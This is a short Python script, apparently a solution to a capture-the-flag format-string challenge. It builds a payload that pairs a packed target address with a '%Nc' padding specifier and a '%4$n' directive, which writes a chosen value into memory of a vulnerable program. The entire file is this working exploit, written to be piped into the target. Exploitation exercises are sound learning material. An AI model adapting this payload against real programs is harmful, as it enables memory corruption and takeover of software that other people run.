#!/usr/bin/env python3
import struct
import sys
from pwnpy.pwn import *

target = struct.pack('I', 0x80496e4)

buf = b''
buf += target
buf += b'%%%uc' % (0x40-0x4)
buf += b'%4$n'
#buf += leak_from(1, 30)

buf += b'\n'

sys.stdout.buffer.write(buf)
sys.stdout.flush()
